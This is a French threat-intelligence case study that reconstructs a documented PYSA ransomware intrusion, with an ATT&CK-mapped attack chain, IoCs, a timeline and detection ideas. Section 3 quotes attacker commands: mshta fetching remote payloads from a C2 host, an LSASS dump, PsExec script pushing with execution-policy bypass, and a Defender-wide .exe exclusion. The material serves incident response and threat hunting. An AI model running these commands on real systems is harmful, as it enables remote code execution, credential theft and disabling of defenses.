# PYSA / Mespinoza - Étude de cas DFIR

👉🏾 [**English version**](./dfir_case_study.md)

**AFRINTEL Threat Actor Intelligence**

- **Acteur / Opération :** PYSA / Mespinoza
- **Type de menace :** Ransomware / Double extorsion
- **Type d'analyse :** Reconstruction DFIR d'une intrusion documentée
- **Durée documentée :** environ 8 heures
- **Source principale :** The DFIR Report, Case 1010
- **Date du rapport :** 23 novembre 2020
- **Géographie :** cas externe de référence, pas une victime africaine AFRINTEL
- **Dernière mise à jour :** 26 août 2026

---

## 1. Synthèse de l'incident

The DFIR Report a documenté une intrusion dans laquelle l'acteur est entré via un service RDP exposé sur Internet avec un compte Domain Administrator valide. La première connexion provenait d'un nœud de sortie Tor et l'accès RDP a ensuite été transféré entre trois adresses Tor au cours de l'intrusion.

L'acteur s'est déplacé vers un contrôleur de domaine en quelques minutes, a déployé PowerShell Empire, utilisé Koadic, récupéré des identifiants à plusieurs reprises, effectué l'essentiel de ses déplacements via RDP, utilisé PsExec pour automatiser la collecte d'identifiants puis déployé PYSA vers 7 h 30 après l'accès initial.

Le canal d'exfiltration n'a pas été observé en clair. En revanche, l'exfiltration elle-même a été confirmée : des documents canaris présents dans l'environnement ont été ouverts depuis des nœuds de sortie Tor après le chiffrement.

Il s'agit d'un **cas DFIR au niveau incident**. AFRINTEL n'applique pas cette chaîne complète à toutes les victimes PYSA.

---

## 2. Chaîne d'attaque principale

| Phase | Technique | ATT&CK | Comportement | Preuve | Portée | Confiance | Provenance |
|---|---|---|---|---|---|---|---|
| Accès initial | External Remote Services | T1133 | RDP exposé sur Internet | Observé | Incident | Élevée | The DFIR Report |
| Accès initial | Valid Accounts | T1078 | Compte Domain Administrator valide | Observé | Incident | Élevée | The DFIR Report |
| Accès distant | Remote Desktop Protocol | T1021.001 | RDP utilisé pour l'entrée et la majorité du mouvement latéral | Observé | Incident | Élevée | The DFIR Report |
| Exécution | PowerShell | T1059.001 | Launcher Empire et autres scripts | Observé | Incident | Élevée | The DFIR Report |
| Exécution | Mshta | T1218.005 | Koadic lancé via `mshta` | Observé | Incident | Élevée | The DFIR Report |
| Persistance | Scheduled Task | T1053.005 | Tâche Koadic HTA exécutée à l'ouverture de session en SYSTEM | Observé | Incident | Élevée | The DFIR Report |
| Credential Access | LSASS Memory | T1003.001 | Task Manager, `comsvcs.dll`, Mimikatz ; ProcDump tenté | Observé | Incident | Élevée | The DFIR Report |
| Credential Access | NTDS | T1003.003 | Shadow Copy contenant `ntds.dit` créée et consultée | Observé | Incident | Élevée | The DFIR Report |
| Discovery | Account Discovery | T1087 | `whoami`, `net` et autres commandes | Observé | Incident | Élevée | The DFIR Report |
| Discovery | Remote System Discovery | T1018 | Commandes natives et découverte réseau | Observé | Incident | Élevée | The DFIR Report |
| Discovery | Domain Trust Discovery | T1482 | `nltest` et reconnaissance AD | Observé | Incident | Élevée | The DFIR Report |
| Discovery | Process Discovery | T1057 | Liste des processus pendant la reconnaissance locale | Observé | Incident | Élevée | The DFIR Report |
| Mouvement latéral | SMB/Windows Admin Shares | T1021.002 | Distribution de scripts avec PsExec | Observé | Incident | Élevée | The DFIR Report |
| Exécution | Service Execution | T1569.002 | PsExec utilisé pour l'exécution distante | Observé | Incident | Élevée | The DFIR Report |
| Defense Evasion | Impair Defenses | T1562.001 | Defender désactivé et exclusions ajoutées | Observé | Incident | Élevée | The DFIR Report / mapping AFRINTEL |
| Exfiltration | Exfiltration Over C2 Channel | T1041 | Canal non observé ; RDP/Empire/Koadic évalués comme chemins probables | Évalué | Incident | Moyenne | The DFIR Report |
| Impact | Data Encrypted for Impact | T1486 | PYSA déployé et exécuté | Observé | Incident | Élevée | The DFIR Report |

---

## 3. Commandes et artefacts principaux

### Lancement Koadic

```text
mshta http://45.147.231.210:9999/8k6Mq
mshta http://45.147.231.210:9999/VtgyT
```

### Persistance Koadic

```text
schtasks /create /tn K0adic /tr "C:\Windows\system32\mshta.exe C:\ProgramData\SZWXNUHHDP.hta" /sc onlogon /ru System /f
```

### Credential dumping

```text
procdump.exe -accepteula -ma lsass.exe mem.dmp
```

La commande ProcDump a été tentée, mais l'exécutable n'était pas présent sur l'endpoint. D'autres techniques LSASS ont bien été utilisées, notamment Task Manager et `comsvcs.dll`.

### Distribution PsExec

```text
PsExec.exe -d \\HOST -u "DOMAIN\USER" -p "PASSWORD" -accepteula -s cmd /c "powershell.exe -ExecutionPolicy Bypass -file \\DOMAINCONTROLLER\share$\p.ps1"
```

### Exclusion Defender

```powershell
Add-MpPreference -ExclusionExtension ".exe"
```

Le cas documente également les Event IDs Defender 5001 et 5007 autour des modifications de protection.

---

## 4. Infrastructure et IoC historiques

| Indicateur | Contexte |
|---|---|
| `198.96.155.3` | RDP / sortie Tor |
| `23.129.64.190` | RDP / sortie Tor |
| `185.220.100.240` | RDP / sortie Tor |
| `194.36.190.74:443` | C2 Empire |
| `45.147.231.210:9999` | C2 Koadic |

### Fichiers / hashes

| Fichier | SHA-256 |
|---|---|
| `svchost.exe` | `df0cd6a8a67385ba67f9017a78d6582db422a137160176c2c5c3640b482b4a6c` |
| `p.ps1` | `eb1d0acd250d32e16fbfb04204501211ba2a80e34b7ec6260440b7d563410def` |
| `p.ps1` | `0ab8f14e2c1e6f7c4dfa3d697d935d4fbef3605e15fd0d489d39b7f82c84ba7e` |
| `XEKFGUIQQB.hta` | `81e0d5945ab7374caf2353f8d019873c88728a6c289884a723321b8a21df3c77` |

Ce sont des IoC historiques propres à l'incident de 2020. Ils ne doivent pas être traités comme une infrastructure PYSA actuelle par défaut.

---

## 5. Évaluation de l'exfiltration

La source n'a pas observé de trafic d'exfiltration en clair. Elle a cependant confirmé que des fichiers avaient quitté l'environnement grâce aux callbacks de documents canaris après le déploiement du ransomware.

AFRINTEL retient donc :

- **Exfiltration :** Confirmée
- **Canal exact :** Non confirmé
- **Canal probable :** RDP, Empire ou Koadic
- **Preuve :** Observé pour le fait que les fichiers sont sortis ; Évalué pour le canal
- **Confiance :** Élevée pour l'exfiltration, Moyenne pour le canal

---

## 6. Chronologie simplifiée

```text
T+00:00   RDP exposé + Domain Admin valide
T+00:03   Mouvement vers le contrôleur de domaine
           |-- discovery
           |-- PowerShell Empire
           |-- collecte LSASS / credentials
           |-- Koadic
           |-- RDP / PsExec
           |-- collecte de fichiers
           |-- affaiblissement de Defender
T+~07:30  Début du déploiement PYSA
           |-- chiffrement
           |-- callbacks canaris : exfiltration confirmée
```

---

## 7. Pistes de détection et Threat Hunting

Signaux utiles :

- RDP exposé utilisé par un compte privilégié depuis une infrastructure Tor/VPN ;
- pivot RDP très rapide d'un poste vers un contrôleur de domaine ;
- `mshta` téléchargeant du contenu HTA/JScript distant ;
- tâche planifiée lançant `mshta` depuis `C:\ProgramData` ;
- dump LSASS via `comsvcs.dll` ou Task Manager ;
- PsExec distribuant des scripts PowerShell depuis un partage du contrôleur de domaine ;
- activité Shadow Copy sur `ntds.dit` et Event ID Directory Service 1917 ;
- exclusion Defender portant sur tous les fichiers `.exe` ;
- credential dumping répété sur plusieurs systèmes.

---

## 8. Évaluation AFRINTEL et lacunes

Ce cas est utile parce que le ransomware n'est que la dernière étape. L'intrusion peut être reconstruite à partir des preuves d'accès, d'identité, C2, discovery, credential theft, mouvement latéral, defense evasion, collecte et impact.

Le cas public ne prouve pas que toutes les intrusions PYSA ont suivi ce même playbook. Il ne permet pas non plus d'identifier avec certitude le canal C2 exact utilisé pour sortir les fichiers.

---

## 9. Sources

- The DFIR Report - **PYSA/Mespinoza Ransomware**, 23 novembre 2020, Case 1010
- MITRE ATT&CK pour la normalisation des techniques

---

**AFRINTEL - African Cyber Threat Intelligence**
